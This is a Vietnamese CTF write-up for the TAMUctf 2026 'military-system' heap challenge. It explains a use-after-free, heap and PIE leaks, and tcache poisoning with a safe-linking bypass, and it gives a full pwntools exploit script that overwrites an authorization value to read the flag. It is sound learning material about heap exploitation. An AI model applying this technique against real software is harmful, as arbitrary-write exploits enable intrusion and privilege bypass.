# TAMUctf 2026 - military-system

## TL;DR

Bug chính là `use-after-free` trên con trỏ draft:

- `close channel` có `free(draft_ptr)` nhưng không xóa `draft_ptr` và `draft_size`.
- `edit draft` chỉ kiểm tra `draft_ptr != NULL`, nên vẫn cho ghi vào chunk đã free.
- `view status` trên channel đã đóng còn in ra `last_draft=%p`, nên leak được địa chỉ heap.
- `view status` cũng in `diagnostic_hook=%p`, thực chất là địa chỉ hàm `render_status`, nên leak được PIE.

Primitive cuối cùng dùng để lấy flag là:

- tạo 2 chunk cùng size trong tcache,
- `free` cả hai,
- poison `tcache->next` của chunk head bằng UAF write,
- ép `malloc` trả về `&g_auth.clearance`,
- ghi magic `0x00000007434F4D44`,
- gọi `transmit` để binary `open("/flag.txt")`.

Flag:

```text
gigem{st4le_dr4ft_tcache_auth_bypass}
```

## 1. Recon

Binary là:

- `aarch64`
- `PIE`
- `Full RELRO`
- `NX`
- có `canary`

Mục tiêu rõ nhất nằm ở menu `Transmit report`. Khi reverse `main`, nhánh này kiểm tra:

```c
if (g_auth.clearance != 0x00000007434F4D44)
    puts("[PATRIOT-7] Clearance denied.");
else
    open("/flag.txt", 0);
```

Vậy không cần ROP, không cần shell, không cần hijack GOT. Chỉ cần làm cho `g_auth.clearance` bằng magic là đủ.

## 2. Cấu trúc dữ liệu quan trọng

Từ disassembly có thể suy ra mỗi channel dài `0x38` byte:

```c
struct channel {
    uint32_t state;        // 0 = closed, 1 = open
    char callsign[0x20];   // bắt đầu ở offset 0x4
    size_t draft_size;     // offset 0x28
    char *draft_ptr;       // offset 0x30
};
```

Có 2 channel trong `g_channels`, tổng cộng `0x70` byte ở `.bss`.

Ngoài ra còn có `g_auth` ở `.bss`; trường cần thiết là:

```c
g_auth.clearance @ PIE + 0x200c0
```

## 3. Phân tích từng menu

### 3.1 Open channel

- Chỉ bật `state = 1`
- nhập `callsign`
- reset metadata liên quan

Không có cấp phát heap ở đây.

### 3.2 Queue message

Luồng chính:

```c
if (!channel->state) fail;
if (channel->draft_ptr != NULL) fail;
size = read_ulong();
if (size < 0x40 || size > 0x80) fail;
ptr = malloc(size);
channel->draft_size = size;
channel->draft_ptr = ptr;
read(0, ptr, size);
```

Điểm quan trọng:

- chỉ cho size từ `0x40` đến `0x80`
- chunk user hợp lệ để đi qua tcache

### 3.3 Edit draft

Luồng:

```c
if (!channel->state && channel->draft_ptr == NULL) fail;
span = read_ulong();
if (span > channel->draft_size) fail;
read(0, channel->draft_ptr, span);
```

Lỗi ở đây là điều kiện không đủ chặt. Sau khi `close`, `state = 0` nhưng `draft_ptr` vẫn giữ giá trị cũ, nên hàm vẫn cho phép `read()` vào vùng đã free.

Đây là `UAF write`.

### 3.4 Close channel

Luồng:

```c
if (!channel->state) fail;
if (channel->draft_ptr)
    free(channel->draft_ptr);
channel->state = 0;
puts("Channel parked for audit review.");
```

Vấn đề:

- có `free`
- nhưng không set `draft_ptr = NULL`
- cũng không xóa `draft_size`

Đây là nguồn gốc của `stale metadata`.

### 3.5 View status

Khi channel đóng nhưng metadata vẫn còn, binary in:

```text
[STATUS] draft_size=...
[STATUS] last_draft=%p
[STATUS] diagnostic_hook=%p
[STATUS] stale metadata retained for deferred audit replay.
```

Hai leak cực quan trọng:

- `last_draft`: địa chỉ heap của chunk vừa free
- `diagnostic_hook`: thực chất là địa chỉ hàm `render_status`

Suy ra:

```python
heap = leaked_last_draft
pie  = leaked_hook - elf.sym.render_status
```

## 4. Primitive đã bỏ: fake fastbin/fake chunk ở `.bss`

Nhánh mình thử trước đó là ép `malloc` trả về một fake chunk trong `.bss`, rồi ghi đè dữ liệu gần `g_auth`.

Hướng đó có thể làm được trong vài biến thể, nhưng có 3 vấn đề:

1. Phải xử lý layout giả lập chunk khá nhạy cảm.
2. Dễ lệ thuộc vào việc allocator đang lấy entry theo tcache hay fastbin.
3. Cần dựng size/metadata giả ở `.bss`, dễ vỡ khi lệch offset.

Sau khi đọc lại binary, mình nhận ra mục tiêu thực chất chỉ là 1 qword `clearance`, nên primitive tốt hơn là:

- không dựng fake chunk,
- không giả metadata ở `.bss`,
- chỉ poison thẳng tcache để `malloc` trả về `&g_auth.clearance`.

Đây là hướng exploit cuối cùng.

## 5. Ý tưởng exploit cuối cùng

### 5.1 Tại sao cần 2 chunk

Nếu chỉ:

- alloc A
- free A
- poison A->next = target

thì lần `malloc` tiếp theo sẽ lấy A, nhưng `tcache count` về 0. Dù head lúc đó là `target`, lần `malloc` sau không dùng entry poisoned nữa.

Vì thế cần 2 chunk:

- alloc A
- alloc B
- free A
- free B

Khi đó tcache bin cho size `0x70` sẽ là:

```text
head -> B -> A
count = 2
```

Sau khi poison `B->next = target`:

```text
head -> B -> target
count = 2
```

Lần `malloc` thứ nhất:

- trả về B
- head trở thành `target`
- count giảm còn 1

Lần `malloc` thứ hai:

- trả về `target`

Đó chính là điều mình cần.

### 5.2 Safe-linking

glibc dùng safe-linking cho singly linked list trong tcache:

```c
stored_next = next ^ (chunk_addr >> 12)
```

Ta đã leak được địa chỉ chunk B qua `last_draft`, nên tính được:

```python
poisoned_fd = target ^ (heap_b >> 12)
```

Ở đây:

- `heap_b` là địa chỉ chunk B vừa free
- `target = pie + 0x200c0`

## 6. Các bước khai thác

Chọn size:

```python
req = 0x60
```

Chunk user size `0x60` tương ứng chunk heap size `0x70`, đủ để đi tcache.

### Bước 1: tạo 2 chunk cùng size

```python
open_ch(0, b"ALPHA")
queue_msg(0, 0x60, b"A"*0x60)

open_ch(1, b"BRAVO")
queue_msg(1, 0x60, b"B"*0x60)
```

### Bước 2: free cả hai

```python
close_ch(0)
close_ch(1)
```

Lúc này tcache bin chứa `B -> A`.

### Bước 3: leak heap + PIE

Dùng `view_status(1)` vì chunk vừa free gần nhất là của channel 1.

```python
view_status(1)
blob = recvuntil("audit replay")
heap = parse(last_draft)
hook = parse(diagnostic_hook)
pie = hook - elf.sym.render_status
clearance = pie + 0x200c0
```

### Bước 4: poison tcache head bằng UAF write

Vì channel 1 vẫn giữ `draft_ptr`, ta sửa 8 byte đầu của chunk B đã free:

```python
poisoned_fd = clearance ^ (heap >> 12)
edit_draft(1, 8, p64(poisoned_fd))
```

Giờ danh sách logic là:

```text
head -> B -> &g_auth.clearance
```

### Bước 5: malloc lần 1 để consume chunk thật

```python
open_ch(1, b"REUSE1")
queue_msg(1, 0x60, b"C"*0x60)
```

Chunk B được lấy ra, còn head của tcache là `&g_auth.clearance`.

### Bước 6: malloc lần 2 trúng mục tiêu

```python
open_ch(0, b"REUSE0")
queue_msg(0, 0x60, p64(0x00000007434F4D44) + b"\x00"*(0x60-8))
```

Lần này `malloc(0x60)` trả về `&g_auth.clearance`, nên 8 byte đầu payload sẽ ghi trực tiếp magic vào đó.

### Bước 7: trigger nhánh đọc flag

```python
transmit(0)
```

Binary đi qua check:

```c
if (g_auth.clearance == magic)
    open("/flag.txt", 0);
```

Remote trả về:

```text
[PATRIOT-7] Transmitting sealed report:
gigem{st4le_dr4ft_tcache_auth_bypass}
```

## 7. Sơ đồ heap

Trạng thái sau hai lần `free`:

```text
tcache[0x70]:
    head -> B -> A
```

Sau poison:

```text
tcache[0x70]:
    head -> B -> &g_auth.clearance
```

Sau alloc lần 1:

```text
queue_msg(slot=1):
    returns B

tcache[0x70]:
    head -> &g_auth.clearance
```

Sau alloc lần 2:

```text
queue_msg(slot=0):
    returns &g_auth.clearance
```

## 8. Exploit script

File exploit hoàn chỉnh:

```python
#!/usr/bin/env python3
from pwn import *
import re

context.binary = elf = ELF('./military-system', checksec=False)
context.log_level = 'info'

HOST = 'streams.tamuctf.com'
PORT = 443
SNI = 'military-system'


def start():
    if args.REMOTE:
        return remote(HOST, PORT, ssl=True, sni=SNI)
    return process(
        ['qemu-aarch64', '-L', './sysroot236/usr/aarch64-linux-gnu', './military-system'],
        stdin=PTY,
        stdout=PTY,
    )


def menu(io, c):
    io.sendlineafter(b'> ', str(c).encode())


def open_ch(io, slot, callsign=b'A'):
    menu(io, 1)
    io.sendlineafter(b'Slot: ', str(slot).encode())
    io.sendlineafter(b'Callsign: ', callsign)


def queue_msg(io, slot, size, data):
    assert len(data) == size
    menu(io, 2)
    io.sendlineafter(b'Slot: ', str(slot).encode())
    io.sendlineafter(b'Draft bytes (64-128): ', str(size).encode())
    io.sendafter(f'Draft payload ({size} bytes): '.encode(), data)


def edit_draft(io, slot, span, data):
    assert len(data) == span
    menu(io, 3)
    io.sendlineafter(b'Slot: ', str(slot).encode())
    io.sendlineafter(b'Editor span: ', str(span).encode())
    io.sendafter(f'Patch bytes ({span}): '.encode(), data)


def close_ch(io, slot):
    menu(io, 4)
    io.sendlineafter(b'Slot: ', str(slot).encode())


def view_status(io, slot):
    menu(io, 5)
    io.sendlineafter(b'Slot: ', str(slot).encode())


def transmit(io, slot):
    menu(io, 6)
    io.sendlineafter(b'Slot: ', str(slot).encode())


def main():
    io = start()

    req = 0x60

    open_ch(io, 0, b'ALPHA')
    queue_msg(io, 0, req, b'A' * req)
    open_ch(io, 1, b'BRAVO')
    queue_msg(io, 1, req, b'B' * req)
    close_ch(io, 0)
    close_ch(io, 1)

    view_status(io, 1)
    blob = io.recvuntil(b'stale metadata retained for deferred audit replay.\\n', drop=False)
    m1 = re.search(rb'last_draft=(0x[0-9a-fA-F]+)', blob)
    m2 = re.search(rb'diagnostic_hook=(0x[0-9a-fA-F]+)', blob)
    if not m1 or not m2:
        raise SystemExit('leak failed')

    heap = int(m1.group(1), 16)
    hook = int(m2.group(1), 16)
    pie = hook - elf.sym.render_status
    clearance = pie + 0x200c0

    poisoned_fd = clearance ^ (heap >> 12)
    edit_draft(io, 1, 8, p64(poisoned_fd))

    open_ch(io, 1, b'REUSE1')
    queue_msg(io, 1, req, b'C' * req)

    open_ch(io, 0, b'REUSE0')
    magic = 0x00000007434F4D44
    payload = p64(magic) + b'\\x00' * (req - 8)
    queue_msg(io, 0, req, payload)

    transmit(io, 0)
    io.interactive()


if __name__ == '__main__':
    main()
```

## 9. Vì sao exploit này ổn định

Hướng cuối cùng ổn định hơn fake chunk ở `.bss` vì:

- chỉ dựa vào primitive thật sự do bug sinh ra: `UAF write`
- dùng đúng allocator path tự nhiên của glibc: `tcache`
- không cần fake size field trong `.bss`
- chỉ cần ghi đúng 1 qword vào `g_auth.clearance`

Nói ngắn gọn: bài này không cần “chiếm quyền điều khiển luồng thực thi”, chỉ cần “vượt qua điều kiện authorization”.

## 10. Lessons learned

Ba điểm khiến bài này dễ bị đi sai hướng:

1. Thấy `.bss` gần `g_auth` nên dễ nghĩ tới fake chunk/global overlap.
2. Thấy có leak heap/PIE nên dễ lao sang ROP hoặc hook overwrite.
3. Quên mất mục tiêu thực ra chỉ là một giá trị auth check.

Khi rút gọn về đúng điều kiện thắng:

```text
write 0x00000007434F4D44 to g_auth.clearance
```

thì lời giải trở nên đơn giản và sạch hơn rất nhiều.
